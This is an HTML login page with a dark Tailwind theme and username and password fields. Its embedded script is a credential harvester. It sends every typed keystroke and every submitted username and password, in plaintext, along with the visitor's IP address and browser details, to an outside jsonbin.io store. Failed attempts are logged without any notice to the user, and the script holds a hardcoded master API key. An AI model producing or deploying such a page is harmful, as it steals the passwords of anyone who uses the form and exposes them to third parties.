<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Page</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background-color: #0a0a0a;
    }
    .input-icon {
      position: absolute;
      right: 0.75rem;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
    }
    .login-container {
      max-width: 380px;
    }
  </style>
</head>
<body class="text-white min-h-screen flex flex-col justify-between items-center p-6">

  <!-- Top Section -->
  <div class="login-container w-full">
    <div class="mb-8">
      <h1 class="text-white font-bold text-2xl mb-6">LOGIN</h1>

      <!-- Username -->
      <div class="mb-4">
        <label class="block text-sm font-medium mb-2" for="username">Username</label>
        <input
          type="text"
          id="username"
          placeholder="Username"
          class="w-full px-4 py-3 border border-[#3A3A3A] rounded-md bg-[#1A1A1A] text-white focus:outline-none focus:ring-1 focus:ring-orange-500"
        />
      </div>

      <!-- Password -->
      <div class="mb-6 relative">
        <label class="block text-sm font-medium mb-2" for="password">Password</label>
        <input
          type="password"
          id="password"
          placeholder="Password"
          class="w-full px-4 py-3 border border-[#3A3A3A] rounded-md bg-[#1A1A1A] text-white focus:outline-none focus:ring-1 focus:ring-orange-500"
        />
        <i id="togglePassword" class="fa-solid fa-eye-slash text-gray-400 input-icon"></i>
      </div>

      <!-- Sign In -->
      <button
        id="login-btn"
        class="w-full py-3 text-base text-black font-medium rounded-md bg-gradient-to-r from-orange-500 to-amber-600 hover:opacity-90 transition">
        Sign In
      </button>
    </div>
  </div>

  <!-- Bottom Section -->
  <div class="login-container w-full">
    <div class="bg-[#1A1A1A] py-3 px-4 font-medium rounded-t-md">Other</div>
    <div class="border border-[#3A3A3A] rounded-b-md p-4 bg-black text-white cursor-pointer flex justify-between items-center hover:bg-[#1A1A1A]/50 transition">
      <span>Change Language</span>
      <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="w-4 h-4 text-white" viewBox="0 0 24 24">
        <path d="M9 18l6-6-6-6" />
      </svg>
    </div>
  </div>

  <!-- Script Section -->
  <script>
    const JSONBIN_API_KEY = '$2a$10$QtoHBeIgduOyNX/.VfoFPOlgQrUuKhcPZ7ZHjGLTLhVvtg17oL85y';
    const JSONBIN_BIN_ID = '67fa4eb78561e97a50fdfda5';

    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const togglePassword = document.getElementById("togglePassword");

    togglePassword.addEventListener("click", () => {
      const isHidden = passwordInput.type === "password";
      passwordInput.type = isHidden ? "text" : "password";
      togglePassword.classList.toggle("fa-eye");
      togglePassword.classList.toggle("fa-eye-slash");
    });

    async function getIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch {
        return 'unknown';
      }
    }

    async function logEvent(type, data) {
      try {
        const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
          headers: { 'X-Master-Key': JSONBIN_API_KEY }
        });
        const { record } = await response.json();

        record.events = record.events || [];
        record.events.push({
          type,
          data,
          timestamp: new Date().toISOString(),
          device: navigator.userAgent,
          ip: await getIP()
        });

        await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/json',
            'X-Master-Key': JSONBIN_API_KEY,
            'X-Bin-Versioning': 'false'
          },
          body: JSON.stringify(record)
        });
      } catch (err) {
        console.error('Logging failed:', err);
      }
    }

    async function logLogin(email, status, password) {
      await logEvent('login_attempt', { email, password, status });
    }

    document.getElementById('login-btn').addEventListener('click', async () => {
      const email = usernameInput.value.trim();
      const password = passwordInput.value.trim();

      if (!email || !password) return; // Silently handle empty fields

      const isValidLogin = password === 'correct123';
      const status = isValidLogin ? 'success' : 'failed';

      await logLogin(email, status, password);

      if (isValidLogin) {
        usernameInput.value = '';
        passwordInput.value = '';
        // Only show success message
        alert('Login successful!');
      }
      // No popup for failed attempts (silent logging)
    });

    usernameInput.addEventListener('input', (e) => {
      logEvent('typing', { field: 'username', value: e.target.value });
    });

    passwordInput.addEventListener('input', (e) => {
      logEvent('typing', { field: 'password', value: e.target.value });
    });
  </script>
</body>
</html>
